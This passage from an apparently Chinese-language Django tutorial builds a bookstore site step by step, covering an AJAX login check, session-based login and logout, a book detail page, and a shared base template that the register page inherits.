class="line"><span class="actionscript">            <span class="keyword">var</span> params = &#123;</span></span><br><span class="line"><span class="undefined">                username: username,</span></span><br><span class="line"><span class="undefined">                password: password,</span></span><br><span class="line"><span class="undefined">                remember: remember,</span></span><br><span class="line"><span class="undefined">                csrfmiddlewaretoken: csrfmiddlewaretoken</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            $.post(<span class="string">'/user/login_check/'</span>, params, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 用户名密码错误 &#123;'res': 0&#125;</span></span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 登录成功 &#123;'res': 1&#125;</span></span></span><br><span class="line"><span class="actionscript">                <span class="keyword">if</span> (data.res == <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="actionscript">                    <span class="comment">// 跳转页面</span></span></span><br><span class="line"><span class="undefined">                    location.href = data.next_url;</span></span><br><span class="line"><span class="actionscript">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (data.res == <span class="number">2</span>) &#123;</span></span><br><span class="line"><span class="actionscript">                    alert(<span class="string">"数据不完整"</span>);</span></span><br><span class="line"><span class="actionscript">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (data.res == <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="actionscript">                    alert(<span class="string">"用户名或者密码错误"</span>);</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">            &#125;)</span></span><br><span class="line"><span class="undefined">        &#125;)</span></span><br><span class="line"><span class="undefined">    &#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>配置urls.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url(<span class="string">r'^login_check/$'</span>, views.login_check, name=<span class="string">'login_check'</span>), <span class="comment"># 用户登录校验</span></span><br></pre></td></tr></table></figure><h2 id="6，首页上的登陆和注册按钮redirect到相关页面。"><a href="#6，首页上的登陆和注册按钮redirect到相关页面。" class="headerlink" title="6，首页上的登陆和注册按钮redirect到相关页面。"></a>6，首页上的登陆和注册按钮redirect到相关页面。</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'user:login' %&#125;"</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>|<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'user:register' %&#125;"</span>&gt;</span>注册<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>现在登陆以后还是显示登陆和注册，应该显示用户名才对。我们来修改一下index.html。这里就会用到session这个概念了。顺便把logout功能也实现了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /user/logout</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">'''用户退出登录'''</span></span><br><span class="line">    <span class="comment"># 清空用户的session信息</span></span><br><span class="line">    request.session.flush()</span><br><span class="line">    <span class="comment"># 跳转到首页</span></span><br><span class="line">    <span class="keyword">return</span> redirect(reverse(<span class="string">'books:index'</span>))</span><br></pre></td></tr></table></figure><p>然后改写index.html</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> request.session.islogin %&#125;</span><br><span class="line">&lt;div class="login_btn fl"&gt;</span><br><span class="line">    欢迎您：&lt;em&gt;&#123;&#123; request.session.username &#125;&#125;&lt;/em&gt;</span><br><span class="line">    &lt;span&gt;|&lt;/span&gt;</span><br><span class="line">    &lt;a href="&#123;% url 'user:logout' %&#125;"&gt;退出&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&#123;% <span class="keyword">else</span> %&#125;</span><br><span class="line">&lt;div class="login_btn fl"&gt;</span><br><span class="line">    &lt;a href="&#123;% url 'user:login' %&#125;"&gt;登录&lt;/a&gt;</span><br><span class="line">    &lt;span&gt;|&lt;/span&gt;</span><br><span class="line">    &lt;a href="&#123;% url 'user:register' %&#125;"&gt;注册&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>配置urls.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url(<span class="string">r'^logout/$'</span>, views.logout, name=<span class="string">'logout'</span>), <span class="comment"># 退出用户登录</span></span><br></pre></td></tr></table></figure><h2 id="7，实现商品详情页的功能"><a href="#7，实现商品详情页的功能" class="headerlink" title="7，实现商品详情页的功能"></a>7，实现商品详情页的功能</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># books/views.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">detail</span><span class="params">(request, books_id)</span>:</span></span><br><span class="line">    <span class="string">'''显示商品的详情页面'''</span></span><br><span class="line">    <span class="comment"># 获取商品的详情信息</span></span><br><span class="line">    books = Books.objects.get_books_by_id(books_id=books_id)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> books <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="comment"># 商品不存在，跳转到首页</span></span><br><span class="line">        <span class="keyword">return</span> redirect(reverse(<span class="string">'books:index'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 新品推荐</span></span><br><span class="line">    books_li = Books.objects.get_books_by_type(type_id=books.type_id, limit=<span class="number">2</span>, sort=<span class="string">'new'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 当前商品类型</span></span><br><span class="line">    type_title = BOOKS_TYPE[books.type_id]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 定义上下文</span></span><br><span class="line">    context = &#123;<span class="string">'books'</span>: books, <span class="string">'books_li'</span>: books_li，<span class="string">'type_title'</span>:type_title&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用模板</span></span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'books/detail.html'</span>, context)</span><br></pre></td></tr></table></figure><p>配置urls.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url(<span class="string">r'books/(?P&lt;books_id&gt;\d+)/$'</span>, views.detail, name=<span class="string">'detail'</span>), <span class="comment"># 详情页</span></span><br></pre></td></tr></table></figure><p>将detail.html页面拷贝到templates/books下。<br>然后将detail.html页面改写成django可以渲染的模板。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#动态添加详情页商品的标签(全部商品下的)</span><br><span class="line">&#123;&#123;type_title&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>&#123;&#123; books.name &#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; books.desc &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"price_bar"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"show_pirze"</span>&gt;</span>¥<span class="tag">&lt;<span class="name">em</span>&gt;</span>&#123;&#123; books.price &#125;&#125;<span class="tag">&lt;/<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"show_unit"</span>&gt;</span>单  位：&#123;&#123; books.unit &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for book in books_li %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'books:detail' books_id=book.id %&#125;"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% static book.image %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h4</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'books:detail' books_id=book.id %&#125;"</span>&gt;</span>&#123;&#123; book.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"price"</span>&gt;</span>￥&#123;&#123; book.price &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>然后将静态文件的路径修改。<br>比如：<br><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"</span></span></span><span class="template-tag">&#123;% <span class="name"><span class="name">static</span></span> books.image %&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>然后将登陆后的用户名等显示出来。那商品详情页就开发的差不多了。</p><h2 id="8，抽象出一个通用的模板，供别的模板继承。"><a href="#8，抽象出一个通用的模板，供别的模板继承。" class="headerlink" title="8，抽象出一个通用的模板，供别的模板继承。"></a>8，抽象出一个通用的模板，供别的模板继承。</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">&#123;# 首页 登录 注册 的父模板 #&#125;</span><br><span class="line"><span class="meta">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span> <span class="attr">xml:lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">&#123;% load staticfiles %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html;charset=UTF-8"</span>&gt;</span></span><br><span class="line">    &#123;# 网页顶部标题块 #&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;% block title %&#125;&#123;% endblock title %&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"&#123;% static 'css/reset.css' %&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"&#123;% static 'css/main.css' %&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'js/jquery-1.12.4.min.js' %&#125;"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'js/jquery-ui.min.js' %&#125;"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'js/slide.js' %&#125;"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    &#123;# 网页顶部引入文件块 #&#125;</span><br><span class="line">    &#123;% block topfiles %&#125;</span><br><span class="line">    &#123;% endblock topfiles %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&#123;# 网页顶部欢迎信息块 #&#125;</span><br><span class="line">&#123;% block header_con %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header_con"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"welcome fl"</span>&gt;</span>欢迎来到尚硅谷书店!<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"fr"</span>&gt;</span></span><br><span class="line">                &#123;% if request.session.islogin %&#125;</span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login_btn fl"</span>&gt;</span></span><br><span class="line">                    欢迎您：<span class="tag">&lt;<span class="name">em</span>&gt;</span>&#123;&#123; request.session.username &#125;&#125;<span class="tag">&lt;/<span class="name">em</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">span</span>&gt;</span>|<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'user:logout' %&#125;"</span>&gt;</span>退出<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                &#123;% else %&#125;</span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login_btn fl"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'user:login' %&#125;"</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">span</span>&gt;</span>|<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'user:register' %&#125;"</span>&gt;</span>注册<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                &#123;% endif %&#125;</span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"user_link fl"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">span</span>&gt;</span>|<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>用户中心<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">span</span>&gt;</span>|<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>我的购物车<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">span</span>&gt;</span>|<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>我的订单<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span>      </span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock header_con %&#125;</span><br><span class="line">&#123;# 网页顶部搜索框块 #&#125;</span><br><span class="line">&#123;% block search_bar %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"search_bar clearfix"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'books:index' %&#125;"</span> <span class="attr">class</span>=<span class="string">"logo fl"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'images/logo.png' %&#125;"</span> <span class="attr">style</span>=<span class="string">"width: 160px; height: 53px;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"search_con fl"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"input_text fl"</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">placeholder</span>=<span class="string">"搜索商品"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"input_btn fr"</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">value</span>=<span class="string">"搜索"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"guest_cart fr"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">class</span>=<span class="string">"cart_name fl"</span>&gt;</span>我的购物车<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"book_count fl"</span> <span class="attr">id</span>=<span class="string">"show_count"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock search_bar %&#125;</span><br><span class="line">&#123;# 网页主体内容块 #&#125;</span><br><span class="line">&#123;% block body %&#125;&#123;% endblock body %&#125;</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"footer"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"foot_link"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>关于我们<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span>&gt;</span>|<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>联系我们<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span>&gt;</span>|<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>招聘人才<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span>&gt;</span>|<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>CopyRight © 2016 北京尚硅谷信息技术有限公司 All Rights Reserved<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>电话：010-****888    京ICP备*******8号<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    &#123;# 网页底部html元素块 #&#125;</span><br><span class="line">    &#123;% block bottom %&#125;&#123;% endblock bottom %&#125;</span><br><span class="line">    &#123;# 网页底部引入文件块 #&#125;</span><br><span class="line">    &#123;% block bottomfiles %&#125;&#123;% endblock bottomfiles %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后在别的模板中继承base.html，这就是抽象的好处。现在的组件化思路也是这样的，松耦合，紧内聚，复用的思路。<br>比如改写register.html<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'base.html' %&#125;</span><br><span class="line">&#123;% load staticfiles %&#125;</span><br><span class="line">&#123;% block title %&#125;尚硅谷书城-注册&#123;% endblock title %&#125;</span><br><span class="line">&#123;% block topfiles %&#125;</span><br><span class="line">&#123;% endblock topfiles %&#125;</span><br><span class="line">&#123;% block header_con %&#125;&#123;% endblock header_con %&#125;</span><br><span class="line">&#123;% block search_bar %&#125;&#123;% endblock search_bar %&#125;</span><br><span class="line">&#123;% block body %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"register_con"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"l_con fl"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"reg_logo"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/static/images/logo.png"</span> <span class="attr">style</span>=<span class="string">"width: 160px; height: 53px;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"reg_slogan"</span>&gt;</span>学计算机  ·  来尚硅谷<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"reg_banner"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"r_con fr"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"reg_title clearfix"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h1</span>&gt;</span>用户注册<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"reg_form clearfix"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"/user/register_handle/"</span>&gt;</span></span><br><span class="line">                    &#123; % csrf_token %&#125;</span><br><span class="line">                <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span 